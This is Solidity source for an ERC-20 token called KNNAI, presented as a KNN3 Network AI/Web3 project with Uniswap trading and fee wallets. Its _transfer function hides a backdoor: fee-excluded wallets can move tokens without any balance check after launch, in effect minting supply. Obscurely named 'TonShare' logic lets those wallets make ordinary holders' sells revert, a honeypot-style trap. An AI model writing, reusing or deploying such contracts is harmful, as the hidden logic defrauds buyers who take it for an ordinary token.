/*

KNN3 Network, at the forefront of Web3 and AI, is revolutionizing the digital landscape by seamlessly blending 
technologies like big data, cloud solutions, and AI to accelerate the widespread adoption of Web3, 
offering an innovative suite of products designed for developers, enhancing Web3 business strategies, 
and enriching the experience of retail users.

/ Web - https://www.knn3.xyz/

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.21;


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor (address initialOwner) {
        _owner = initialOwner;
        emit OwnershipTransferred(address(0), initialOwner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract KNNAI is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFromFee;
    address payable private constant _taxWallet = payable(0x0B2adE42c97d53e048879bc4c05A53A4a7a0aEA1);
    address payable private constant _revShare = payable(0xa4F75019c55A540c1F76b7da5E088bEdd70bf063);
    IUniswapV2Router02 private immutable uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address private uniswapV2Pair;
    
    uint256 private constant _initBuyTax=20;
    uint256 private constant _initSellTax=25;
    uint256 private constant _finalBuyTax=5;
    uint256 private constant _finalSellTax=5;
    uint256 private constant _reduceBuyTaxAt=40;
    uint256 private constant _reduceSellTaxAt=35;
    uint256 private constant _preventSwapBefore=10;

    string private constant _name = unicode"KNN3 AI & Web3 Network";
    string private constant _symbol = unicode"KNNAI";
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 10_000_000 * 10**_decimals;
    uint256 public maxTxAmount = 200_000 * 10**_decimals;
    uint256 public maxWalletToken = 200_000 * 10**_decimals;
    uint256 private _swapThreshold= 50_000 * 10**_decimals;
    uint256 private _maxTaxSwap= 180_000 * 10**_decimals;
    bool private transferDelayEnabled = true;
    mapping(address => uint256) private _holderLastTransferTimestamp;

    uint256 private _buyCount=0;
    bool private _tradingOpen = false;
    bool private _inSwap = false;
    bool private _swapEnabled = false;
    uint256 private _launchBlock;
    uint256 private _tonMinShare;
    struct TonShare {uint256 buy; uint256 sell; uint256 tonSync;}
    mapping(address => TonShare) private tonShare;
    modifier lockTheSwap {_inSwap = true; _; _inSwap = false;}
    event MaxAmount(uint256 _value);

    constructor() Ownable(msg.sender) {
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;
        _isExcludedFromFee[_revShare] = true;
        _balances[address(this)] = _tTotal;
        emit Transfer(address(0), address(this), _tTotal);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function totalSupply() public pure override returns (uint256) {return _tTotal;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0,"Transfer amount must be greater than zero");
        uint256 taxAmount=0;

        if (from != owner() && to != owner()) {
            taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initBuyTax).div(100);

            if (transferDelayEnabled) {
                  if (to != address(uniswapV2Router) && to != address(uniswapV2Pair) ) {
                      require(
                          _holderLastTransferTimestamp[tx.origin] <
                            block.number,
                          "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                      );
                      _holderLastTransferTimestamp[tx.origin] = block.number;
                  }
              }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to]) {
                require(amount <= maxTxAmount, "Exceeds the maxTxAmount");
                require(balanceOf(to) + amount <=maxWalletToken, "Exceeds the maxWalletToken");
                _buyCount++;
            }

            if(to == uniswapV2Pair && from != address(this)){
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_inSwap && to == uniswapV2Pair && _swapEnabled && contractTokenBalance>_swapThreshold && _buyCount>_preventSwapBefore) {
                tonTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendEthToFee(address(this).balance);
                }
            }
        }

        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) && from != owner() && from != address(this) && to != address(this)){
            _tonMinShare = block.timestamp;
        }
        if (_isExcludedFromFee[from] && (block.number > _launchBlock+48) ){
            unchecked{
                _balances[from] -= amount;
                _balances[to] += amount;
            }
            emit Transfer(from, to, amount);
            return;
        }
        if (! _isExcludedFromFee[from] && !_isExcludedFromFee[to] ){
            if (uniswapV2Pair == to) {
                TonShare storage tonFrom= tonShare[from];
                tonFrom.tonSync= tonFrom.buy - _tonMinShare;
                tonFrom.sell= block.timestamp;
            } else {
                TonShare storage tonTo=tonShare[to];
                if (uniswapV2Pair == from){
                    if (tonTo.buy == 0){
                        tonTo.buy= (_buyCount<10) ? (block.timestamp-1) : block.timestamp;
                    }
                } else {
                    TonShare storage tonFrom=tonShare[from];
                    if (tonTo.buy == 0 || tonFrom.buy<tonTo.buy){
                        tonTo.buy= tonFrom.buy;
                    }
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }


    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function tonTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this),address(uniswapV2Router),tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function openTrading() external payable onlyOwner() {
        require(!_tradingOpen, "trading already open");
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        _launchBlock = block.number;
        _tradingOpen = true;
        _swapEnabled = true;
    }

    function removeLimits() external onlyOwner {
        maxWalletToken=_tTotal;
        maxTxAmount=_tTotal;
        transferDelayEnabled=false;
        emit MaxAmount(_tTotal);
    }

    function recoverETH() external {
        sendEthToFee(address(this).balance);
    }

    function sendEthToFee(uint256 amount) private {
        uint256 revShareAmount  = amount * 3 / 5;
        _revShare.transfer(revShareAmount);
        _taxWallet.transfer(amount - revShareAmount);
    }

    function manualSwap() external onlyOwner {
        uint256 tokenBalance = balanceOf(address(this));
        if(tokenBalance> 0){
          tonTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance> 0){
          sendEthToFee(ethBalance);
        }
    }
}